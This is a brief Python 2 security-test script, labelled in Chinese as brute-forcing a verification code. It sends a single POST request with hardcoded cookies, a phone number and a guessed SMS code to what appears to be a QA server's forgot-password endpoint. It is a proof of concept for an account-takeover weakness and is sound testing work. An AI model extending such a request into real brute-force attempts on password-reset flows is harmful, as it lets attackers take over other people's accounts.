# coding=utf-8
# ===============================================================================
# @ Creator:zhn
# @ Date:2016-09-001
# 安全风险测试-爆破验证码
# http://merak-www.qa-01.jimu.com/user/verifyCodeConfirm/forgot/password
# ===============================================================================
import requests
headers = {
    'Host': 'merak-www.qa-01.jimu.com',
    'Content-Length': 57,
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Origin': 'http://merak-www.qa-01.jimu.com',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
cookies = {'tr': 'e529edf6-85a1-4395-9211-ff63f690cd08',
           'ps': '821ca6f3-eef0-4770-bb39-53305544b22e-p',
           'JSESSIONID': 'CED85085E4617B322A3A906D19911C0C'
           }
payload = 'verifyCode=952700&phone=11100003333&captchaInputText=rrbe'

a = requests.post('http://merak-www.qa-01.jimu.com/user/verifyCodeConfirm/forgot/password',
                  headers=headers, data=payload, cookies=cookies)
print a.content